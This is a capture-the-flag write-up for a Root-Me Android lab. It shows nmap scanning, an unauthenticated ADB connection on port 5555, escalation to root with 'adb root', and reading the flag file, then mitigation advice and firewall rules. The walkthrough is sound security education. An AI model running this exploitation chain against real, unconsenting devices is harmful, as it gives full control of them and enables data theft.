# CTF-ATD — End Droid

`CTF All The Day` • `Android Pentest` • `Salle 10`

## TL;DR

An old Android phone is used as a web server. ADB (Android Debug Bridge) is exposed on port 5555 with no authentication. Escalating from `shell` to `root` via `adb root` gives full access to the filesystem and the flag.

**Flag (machine):** `[REDACTED]`

---

## Challenge Description

> A small group of students decided to use an old Android phone as a server to host their project management application. Can you recover the secret communications it contains?

**Target:** `ctf10.root-me.org`

**Context:**
- The machine flag is located at `/data/media/0/passwd`
- The realistic flag is in an undisclosed directory
- Duration: 240 minutes
- Format: CTF-ATD (All The Day) — live virtual environment to attack

> ℹ️ This CTF-ATD is linked to the Root-Me challenge **"End Droid"**. The attack surface and exploitation path are the same, but here you attack a real live virtual environment instead of a local file.

---

## Recon

### Step 1 — Port scan

```bash
$ nmap -sV --open -p- ctf10.root-me.org
```

Results:
```
PORT     STATE SERVICE VERSION
5555/tcp open  adb     Android Debug Bridge device
                       (name: android_x86; model: VMware Virtual Platform; device: x86)
8080/tcp open  http    PHP cli server 5.5 or later

Service Info: OS: Android; CPE: cpe:/o:linux:linux_kernel
```

**Key findings:**
- Port **5555** → ADB exposed with **no authentication** ← main attack vector
- Port **8080** → PHP web app (project management application)
- The device is an **Android x86** running on VMware

---

## Exploitation

### Step 2 — Connect via ADB

ADB (Android Debug Bridge) is a tool normally used by developers to debug Android devices. When exposed on the network with no authentication, it gives direct shell access to the device.

```bash
$ adb connect ctf10.root-me.org:5555
connected to ctf10.root-me.org:5555
```

### Step 3 — Initial shell (limited)

```bash
$ adb shell
uid=2000(shell) gid=2000(shell) groups=1003(graphics),1004(input),...@x86:/ $
```

We land as `uid=2000(shell)` — a restricted user. Attempts to read the flag fail:

```bash
$ cat /passwd
/system/bin/sh: cat: /passwd: No such file or directory

$ ls /data/media/0/
/data/media/0/: Permission denied
```

### Step 4 — Escalate to root

ADB provides a built-in privilege escalation command when the device has an unlocked/debug bootloader:

```bash
$ exit   # exit the shell first
$ adb root
restarting adbd as root
```

Reconnect:
```bash
$ adb shell
uid=0(root) gid=0(root)@x86:/ #
```

✅ We are now **root**.

### Step 5 — Read the flag

```bash
$ ls /data/media/0/
Alarms  Android  Boot_Shell  DCIM  Download  Movies  Music
Notifications  Pictures  Podcasts  Ringtones  htdocs
kickwebinfo  obb  passwd  ssh  storage  www

$ cat /data/media/0/passwd
[REDACTED]
```

**Flag:** `[REDACTED]` ✅

---

## Attack Chain Summary

```
nmap -p- ctf10.root-me.org
        ↓
Port 5555 open (ADB, no auth)
        ↓
adb connect ctf10.root-me.org:5555
        ↓
adb shell → uid=2000(shell)  [restricted]
        ↓
adb root  → restarting adbd as root
        ↓
adb shell → uid=0(root)  [full access]
        ↓
cat /data/media/0/passwd → FLAG
```

---

## Notable Files Found on the Device

```
/data/media/0/
├── htdocs/          ← web server root (PHP app)
├── www/             ← another web directory
├── ssh/             ← SSH config/keys
├── Boot_Shell/      ← startup scripts
├── kickwebinfo/     ← app data
└── passwd           ← machine flag ✅
```

The device is running a full PHP web stack alongside ADB — a classic misconfigured Android server.

---

## Impact & Mitigation

### Real-World Implications

| Vulnerability | Impact |
|---------------|--------|
| **CWE-306** | Missing Authentication for Critical Function |
| **CWE-284** | Improper Access Control |
| **CVE-2019-9798** | ADB exposed over network without authentication |

**Why this is critical:**
- ADB over TCP gives **full shell access** with no credentials required
- `adb root` is available whenever the bootloader is unlocked — very common on old/developer devices
- Once root, the attacker has **complete control**: read all files, install malware, intercept communications, pivot to the internal network
- Real incident: in 2018, thousands of Android mining malware infections spread via exposed ADB on port 5555

**Real-world attack scenarios:**
1. **Data theft**: Read all files including database credentials, user data, private keys
2. **Backdoor installation**: Push a persistent reverse shell with `adb push`
3. **Network pivoting**: Use the compromised device as a relay to attack internal services
4. **Credential harvesting**: Read the PHP app's database config files

---

### Secure Configuration

**❌ NEVER do this:**
```bash
# Enabling ADB over network (TCP) on a production device
adb tcpip 5555   # Exposes port 5555 with no authentication
```

**✅ DO this instead:**

**Option 1 — Disable ADB over TCP entirely:**
```bash
# Keep ADB USB-only, never expose it on the network
adb usb   # Switch back to USB mode
# Or disable ADB completely in Settings > Developer Options
```

**Option 2 — Firewall ADB port:**
```bash
# Block port 5555 from external access
iptables -A INPUT -p tcp --dport 5555 -s 127.0.0.1 -j ACCEPT
iptables -A INPUT -p tcp --dport 5555 -j DROP
```

**Option 3 — Use ADB over WiFi with pairing (Android 11+):**
Android 11+ introduced authenticated wireless ADB pairing with a one-time code — use this instead of raw TCP.

**Best Practices:**
1. **Never expose ADB on a production device** — it is a debug tool, not a server interface
2. **Disable Developer Options** on any device in production
3. **Use a proper server** (Linux/VPS) instead of repurposing a phone
4. **Network segmentation** — IoT/Android devices should never be directly internet-facing
5. **Regular audits** — scan your own infrastructure with `nmap` to detect exposed debug services

---

## What Makes This a CTF-ATD

Unlike static challenges (binary to analyze, web page to exploit), a **CTF-ATD** (All The Day) is a **live attack environment**:

| | Classic Challenge | CTF-ATD |
|---|---|---|
| Environment | Local file / Static URL | Live virtual machine |
| Time limit | None | 240 minutes |
| Interaction | Analyze / Input a payload | Real pentest workflow |
| Skills tested | One specific technique | Recon → Exploit → Post-exploit |
| Flag location | Returned by server | Hidden on the filesystem |

The methodology here mirrors a real Android pentest engagement:
`Recon → Service identification → Exploit misconfiguration → Privilege escalation → Data extraction`

---

## Key Takeaways

**Technical Skills:**
- Used `nmap -sV -p-` for full port + service version scan
- Identified ADB exposed on port 5555 with no authentication
- Connected with `adb connect` and obtained a remote shell
- Escalated from `uid=2000(shell)` to `uid=0(root)` using `adb root`
- Navigated the Android filesystem to locate and read the flag

**Security Concepts:**
- ADB is a **developer tool**, never meant to be internet-facing
- Exposed debug interfaces are one of the most common Android vulnerabilities
- `adb root` works whenever the device has an unlocked bootloader — typical on old/dev devices
- Old repurposed hardware is often full of default misconfigurations

---

## References

- [Android Debug Bridge (ADB) - Android Developers](https://developer.android.com/tools/adb)
- [CVE-2019-9798 - ADB without authentication](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9798)
- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [OWASP Mobile Top 10 - M2: Insecure Data Storage](https://owasp.org/www-project-mobile-top-10/)
- [ADB over WiFi security (Android 11+)](https://developer.android.com/tools/adb#connect-to-a-device-over-wi-fi)